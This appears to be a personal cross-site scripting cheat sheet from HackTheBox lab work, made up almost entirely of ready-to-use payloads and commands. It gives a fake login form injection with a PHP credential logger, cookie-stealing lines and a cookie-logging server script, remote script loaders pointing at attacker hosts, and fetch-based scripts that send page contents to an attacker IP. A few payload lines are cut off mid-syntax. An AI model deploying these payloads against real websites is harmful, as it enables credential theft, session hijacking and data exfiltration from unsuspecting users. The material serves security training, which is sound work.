# XSS

###

```shell
  <script>alert(window.origin)</script>
  <img src="" onerror="javascript:alert(document.cookie)">

  git clone https://github.com/s0md3v/XSStrike.git
  cd XSStrike
  pip install -r requirements.txt
  python xsstrike.py
  python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

```shell
  <script>document.body.style.background = "#141d2b"</script>
  <script>document.title = 'HackTheBox Academy'</script>
  <script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script
```

---

###Â Phishing - Credential Stealing

```shell
  document.write('<h3>Please login to continue</h3><form action=http://10.10.14.227><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
  document.getElementById('urlform').remove();

  # test blind xss with a listener
  nc -lvnp
  '><script src="http://OUR_IP:PORT/FieldName"></script>

  mkdir /tmp/tmpserver
  cd /tmp/tmpserver
  nano index.php
  
  <?php
  if (isset($_GET['username']) && isset($_GET['password'])) {
      $file = fopen("creds.txt", "a+");
      fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
      header("Location: http://10.129.194.90/phishing/index.php");
      fclose($file);
      exit();
  }
  ?>

  sudo php -S 0.0.0.0:80

  # copy the full url link and paste or send it
  
  cat creds.txt
```

---

### Session Hijacking - Cookie Stealing

```shell
  <script src="http://OUR_IP/script.js"></script>
  <script src="http://OUR_IP/username"></script>

  <script src=http://OUR_IP></script>
  '><script src=http://OUR_IP></script>
  "><script src=http://OUR_IP></script>
  javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
  <script>$.getScript("http://OUR_IP")</script>

  mkdir /tmp/tmpserver
  cd /tmp/tmpserver
  sudo php -S 0.0.0.0:80

  document.location='http://OUR_IP/index.php?c='+document.cookie;
  new Image().src='http://OUR_IP/index.php?c='+document.cookie;

  <?php
  if (isset($_GET['c'])) {
      $list = explode(";", $_GET['c']);
      foreach ($list as $key => $value) {
          $cookie = urldecode($value);
          $file = fopen("cookies.txt", "a+");
          fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
          fclose($file);
      }
  }
  ?>
```

```shell
<script>
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.6/exfil?body=" + btoa(body));
})
</script>



<img src=x onerror=alert(1) />
<img src="http://10.10.15.30:8000/image.png" />
<script src="http://10.10.15.30:8000/script.js"></script>



<script src="http://10.10.14.6/script.js"></script>
fetch('http://10.10.14.6/from_script/' + document.cookie);


```
```shell

// XSS Data Exfiltration

async function getData(url) {
  const response = await fetch(url);
  const result = await response.text();
  return result;
}

async function postData(url, data) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
      body: data,
  });
  const result = await response.text();
  return result;
}

async function pwn() {
  const page = await getData('http://<target_ip>/<endpoint>');
  postData('http://<our_ip>:<port>',page);
}

pwn();   


<img src=x onerror="this.remove(); var s=document.createElement('script'); s.src='<our_ip>:<port>/pwn.js'; document.body.appendChild(s
;"></img>
```
